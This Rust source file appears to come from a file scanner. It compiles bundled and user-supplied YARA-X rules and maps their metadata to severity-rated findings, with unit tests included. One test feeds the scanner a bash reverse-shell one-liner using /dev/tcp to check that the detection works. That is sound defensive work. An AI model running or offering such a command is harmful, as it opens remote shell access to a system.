//! YARA-X rule matching. Bundled rules ship in the binary; users can add rule
//! directories. Rule metadata (`category`, `severity`, `title`, `legitimate`)
//! becomes the finding; rules without valid metadata produce `info` findings
//! in the `security.signature_match` category.

use bytebouncer_core::Severity;
use serde::{Deserialize, Serialize};

pub const BUNDLED_RULES: &str = include_str!("../rules/bundled.yar");

/// Rule source text with a name for error messages and reports.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleSource {
    pub name: String,
    pub text: String,
}

pub struct Rules {
    rules: yara_x::Rules,
    /// Names of the sources compiled, for the report's tool list.
    pub sources: Vec<String>,
}

pub struct RuleMatch {
    pub rule: String,
    pub category: String,
    pub severity: Severity,
    pub title: String,
    pub legitimate: Option<String>,
    /// (offset, matched bytes) for the first few matches.
    pub matches: Vec<(u64, Vec<u8>)>,
}

/// Compile bundled rules plus user sources. A user source that fails to
/// compile is skipped and reported, never silently ignored.
pub fn compile(user: &[RuleSource]) -> (Rules, Vec<String>) {
    let mut errors = Vec::new();
    let mut names = vec!["bundled".to_owned()];
    let mut compiler = yara_x::Compiler::new();
    compiler
        .add_source(yara_x::SourceCode::from(BUNDLED_RULES).with_origin("bundled.yar"))
        .expect("bundled rules compile");
    for src in user {
        // Compile each user source alone first so one bad file cannot poison the set.
        if let Err(e) = yara_x::compile(src.text.as_str()) {
            errors.push(format!("rule file {} skipped: {e}", src.name));
            continue;
        }
        match compiler
            .add_source(yara_x::SourceCode::from(src.text.as_str()).with_origin(&src.name))
        {
            Ok(_) => names.push(src.name.clone()),
            Err(e) => errors.push(format!("rule file {} skipped: {e}", src.name)),
        }
    }
    (
        Rules {
            rules: compiler.build(),
            sources: names,
        },
        errors,
    )
}

impl Rules {
    pub fn scan(&self, data: &[u8]) -> Result<Vec<RuleMatch>, String> {
        // No scanner timeout: yara-x implements it with a heartbeat thread,
        // and the Tier 1 seccomp allow-list forbids creating threads. The
        // parent enforces a wall-clock limit by killing the worker instead.
        let mut scanner = yara_x::Scanner::new(&self.rules);
        let results = scanner.scan(data).map_err(|e| e.to_string())?;
        let mut out = Vec::new();
        for rule in results.matching_rules() {
            let mut category = "security.signature_match".to_owned();
            let mut severity = Severity::Info;
            let mut title = format!("YARA rule {} matched", rule.identifier());
            let mut legitimate = None;
            for (key, value) in rule.metadata() {
                let yara_x::MetaValue::String(v) = value else {
                    continue;
                };
                match key {
                    "category" if valid_category(v) => category = v.to_owned(),
                    "severity" => severity = parse_severity(v).unwrap_or(severity),
                    "title" | "description" => title = v.to_owned(),
                    "legitimate" => legitimate = Some(v.to_owned()),
                    _ => {}
                }
            }
            let matches = rule
                .patterns()
                .flat_map(|p| {
                    p.matches()
                        .map(|m| (m.range().start as u64, m.data().to_vec()))
                        .collect::<Vec<_>>()
                })
                .take(5)
                .collect();
            out.push(RuleMatch {
                rule: rule.identifier().to_owned(),
                category,
                severity,
                title,
                legitimate,
                matches,
            });
        }
        Ok(out)
    }
}

fn valid_category(c: &str) -> bool {
    ["security.", "privacy.", "provenance."]
        .iter()
        .any(|p| c.starts_with(p))
        && c.len() < 64
}

fn parse_severity(s: &str) -> Option<Severity> {
    Some(match s {
        "info" => Severity::Info,
        "low" => Severity::Low,
        "medium" => Severity::Medium,
        "high" => Severity::High,
        "critical" => Severity::Critical,
        _ => return None,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn bundled_rules_compile_and_match() {
        let (rules, errors) = compile(&[]);
        assert!(errors.is_empty());
        let m = rules
            .scan(b"x bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
            .unwrap();
        assert_eq!(m.len(), 1);
        assert_eq!(m[0].severity, Severity::High);
        assert_eq!(m[0].category, "security.capability");
        assert!(rules.scan(b"hello world").unwrap().is_empty());
    }

    #[test]
    fn bad_user_rules_are_reported_not_fatal() {
        let bad = RuleSource {
            name: "bad.yar".into(),
            text: "rule x { condition: nope }".into(),
        };
        let good = RuleSource {
            name: "good.yar".into(),
            text: "rule u { meta: severity = \"low\" category = \"privacy.telemetry\" strings: $a = \"track-me\" condition: $a }".into(),
        };
        let (rules, errors) = compile(&[bad, good]);
        assert_eq!(errors.len(), 1);
        let m = rules.scan(b"...track-me...").unwrap();
        assert_eq!(m[0].category, "privacy.telemetry");
    }
}
